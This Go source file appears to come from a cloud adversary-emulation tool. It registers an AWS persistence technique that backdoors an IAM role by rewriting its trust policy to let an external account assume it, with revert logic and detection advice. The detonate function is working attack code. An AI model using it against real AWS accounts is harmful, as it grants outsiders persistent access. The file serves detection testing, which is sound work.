package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
	"strings"
)

//go:embed main.tf
var tf []byte

//go:embed malicious_policy.json
var maliciousIamPolicy string

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.iam-backdoor-role",
		FriendlyName: "Backdoor an IAM Role",
		Description: `
Establishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.

Warm-up: 

- Create an IAM role.

Detonation: 

- Update the assume role policy of the IAM role to backdoor it, making it accessible from an external, fictitious AWS account:

<pre>
<code>
` + maliciousIamPolicy + `
</code>
</pre>
`,
		Detection: `
- Using CloudTrail's <code>UpdateAssumeRolePolicy</code> event.

- Through [IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-iam-role), 
which generates a finding when a role can be assumed from a new AWS account or publicly.
`,
		Platform:                   stratus.AWS,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	roleName := params["role_name"]
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Backdooring IAM role " + roleName + " by allowing sts:AssumeRole from an external AWS account")
	err := updateAssumeRolePolicy(iamClient, roleName, maliciousIamPolicy)
	if err != nil {
		return errors.New("unable to backdoor IAM role: " + err.Error())
	}

	log.Println("Update role trust policy with malicious policy:\n" + maliciousIamPolicy)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	roleName := params["role_name"]
	roleTrustPolicy := strings.ReplaceAll(params["role_trust_policy"], "\\", "") // Terraform output adds backslashes for some reason
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Reverting trust policy of IAM role " + roleName + " to its original state")
	err := updateAssumeRolePolicy(iamClient, roleName, roleTrustPolicy)

	if err != nil {
		return errors.New("unable to backdoor IAM role: " + err.Error())
	}
	return nil
}

func updateAssumeRolePolicy(iamClient *iam.Client, roleName string, roleTrustPolicy string) error {
	_, err := iamClient.UpdateAssumeRolePolicy(context.Background(), &iam.UpdateAssumeRolePolicyInput{
		RoleName:       &roleName,
		PolicyDocument: &roleTrustPolicy,
	})
	return err
}
